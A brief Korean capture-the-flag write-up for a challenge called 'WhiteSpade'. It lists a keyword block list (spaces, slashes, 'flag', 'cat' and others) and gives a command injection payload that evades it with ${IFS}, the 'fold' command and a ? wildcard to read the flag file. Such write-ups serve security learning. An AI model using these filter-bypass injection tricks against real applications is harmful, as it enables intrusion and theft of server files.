# WhiteSpade

![Untitled](https://user-images.githubusercontent.com/37824335/223044022-044f50af-b140-484b-b056-9253f3af0514.png)

제한된 키워드를 피해 커맨드 인젝션을 수행하면 되는 문제

키워드는 직접 테스트해보며 확인하거나 app.py파일을 출력하여 확인 가능

keywords = [' ', '*', '/', '=', '\n', '\r', '\t', '\x0b', '\x0c', '-', '+', 'flag', 'cat']

## Answer

```html
fold${IFS}fla?.txt
```
